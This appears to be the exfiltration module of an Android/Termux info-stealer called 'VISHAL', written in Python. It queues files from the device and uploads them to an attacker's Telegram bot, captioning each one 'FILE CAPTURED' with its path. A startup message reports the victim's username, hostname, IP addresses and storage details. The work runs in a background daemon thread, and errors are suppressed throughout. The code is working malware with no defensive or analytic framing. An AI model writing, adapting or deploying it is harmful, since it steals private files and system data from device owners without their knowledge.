"""
VISHAL Telegram Sender Module
"""
import os
import time
import requests
import threading
from queue import Queue
from datetime import datetime

class TelegramSender:
    """Telegram File Sender Class"""
    
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.queue = Queue()
        self.running = True
        self.sent_count = 0
        self.failed_count = 0
        
        # Start sender thread
        self.thread = threading.Thread(target=self._worker)
        self.thread.daemon = True
        self.thread.start()
    
    def send_message(self, text, parse_mode='HTML'):
        """Send text message"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': text,
                'parse_mode': parse_mode
            }
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def send_file(self, file_path, caption=None):
        """Add file to send queue"""
        if os.path.exists(file_path) and os.path.getsize(file_path) <= 50 * 1024 * 1024:
            self.queue.put((file_path, caption))
            return True
        return False
    
    def _worker(self):
        """Background worker to send files"""
        while self.running:
            try:
                if not self.queue.empty():
                    file_path, caption = self.queue.get(timeout=1)
                    self._send_file_sync(file_path, caption)
                time.sleep(1)
            except:
                time.sleep(2)
    
    def _send_file_sync(self, file_path, caption=None):
        """Synchronously send file"""
        try:
            url = f"{self.base_url}/sendDocument"
            
            if not caption:
                caption = self._generate_caption(file_path)
            
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption,
                    'parse_mode': 'HTML'
                }
                response = requests.post(url, data=data, files=files, timeout=30)
                
                if response.status_code == 200:
                    self.sent_count += 1
                    return True
                else:
                    self.failed_count += 1
        except Exception as e:
            self.failed_count += 1
        return False
    
    def _generate_caption(self, file_path):
        """Generate file caption"""
        name = os.path.basename(file_path)
        size = os.path.getsize(file_path)
        ext = os.path.splitext(file_path)[1]
        
        # Format size
        for unit in ['B', 'KB', 'MB']:
            if size < 1024:
                size_fmt = f"{size:.1f} {unit}"
                break
            size /= 1024
        
        caption = f"📁 <b>FILE CAPTURED</b>\n"
        caption += f"📄 <b>Name:</b> {name}\n"
        caption += f"📦 <b>Size:</b> {size_fmt}\n"
        caption += f"🔧 <b>Type:</b> {ext}\n"
        caption += f"📍 <b>Path:</b> {file_path}\n"
        caption += f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
        caption += f"🤖 <b>Module:</b> VISHAL"
        
        return caption
    
    def send_bulk(self, file_paths):
        """Send multiple files"""
        for file_path in file_paths[:50]:  # Limit 50 files
            self.send_file(file_path)
            time.sleep(2)
    
    def send_startup_message(self, system_info):
        """Send startup information"""
        msg = "🚀 <b>VISHAL MODULE ACTIVATED</b> 🚀\n\n"
        msg += f"👤 <b>User:</b> {system_info['username']}\n"
        msg += f"💻 <b>Host:</b> {system_info['hostname']}\n"
        msg += f"🌍 <b>IP:</b> {', '.join(system_info['ip_addresses'])}\n"
        msg += f"📱 <b>Termux:</b> {'✅' if system_info['termux'] else '❌'}\n"
        msg += f"🤖 <b>Android:</b> {'✅' if system_info['android'] else '❌'}\n"
        msg += f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        # Storage info
        msg += "💾 <b>Storage:</b>\n"
        for path, info in system_info['storage_info'].items():
            msg += f"  • {path}: {info['used']} / {info['total']} ({info['percent']})\n"
        
        self.send_message(msg)
    
    def send_summary(self):
        """Send summary report"""
        msg = "📊 <b>VISHAL SUMMARY REPORT</b> 📊\n\n"
        msg += f"✅ <b>Sent:</b> {self.sent_count}\n"
        msg += f"❌ <b>Failed:</b> {self.failed_count}\n"
        msg += f"📥 <b>Queue:</b> {self.queue.qsize()}\n"
        msg += f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        self.send_message(msg)
    
    def stop(self):
        """Stop sender"""
        self.running = False